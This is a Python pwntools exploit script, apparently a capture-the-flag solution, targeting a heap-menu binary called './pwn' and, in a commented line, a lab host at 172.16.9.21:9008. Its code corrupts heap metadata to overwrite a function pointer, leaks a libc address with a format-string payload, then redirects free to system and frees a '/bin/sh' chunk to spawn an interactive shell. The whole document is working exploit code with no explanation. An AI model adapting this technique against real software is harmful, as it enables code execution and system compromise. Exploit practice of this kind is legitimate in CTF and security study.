from pwn import *
context.log_level = 'debug'
def new(p, idx, size, s):
    p.recvuntil('your choice: ')
    p.sendline('1')
    p.recvuntil('index:')
    p.sendline(str(idx))
    p.recvuntil('size:')
    p.sendline(str(size))
    p.recvuntil('content:')
    p.send(s)

def delete(p, idx):
    p.recvuntil('your choice: ')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(str(idx))

def edit(p, idx, s):
    p.recvuntil('your choice: ')
    p.sendline('3')
    p.recvuntil('index:')
    p.sendline(str(idx))
    p.recvuntil('content:')
    p.send(s)

def main():
    #p = remote('172.16.9.21', 9008)
    p = process('./pwn')
    new(p, 0, 0x18, 'a')
    new(p, 1, 0x18, 'a')

    delete(p, 0)
    delete(p, 1)
    new(p, 0, 0x18, 'a')
    new(p, 0x10, 0x18, 'a')
    delete(p, 0)
    new(p, 1, 0x48, '/bin/sh\x00')
    payload = p64(0) + p64(0x33) + p64(0x602010)
    edit(p, 0, payload)
    new(p, 2, 0x18, '%15$p')
    payload = p64(0) + p64(0x4007B0)
    new(p, 3, 0x18, payload)
    delete(p, 2)
    p.recvuntil('0x')
    libc_base = int(p.recvuntil('free', drop=True), 16) - 0x21b97
    log.success(hex(libc_base))
    #gdb.attach(p)

    payload = p64(0) + p64(libc_base + 0x4f440)
    edit(p, 3, payload)
    delete(p, 1)
    p.interactive()

main()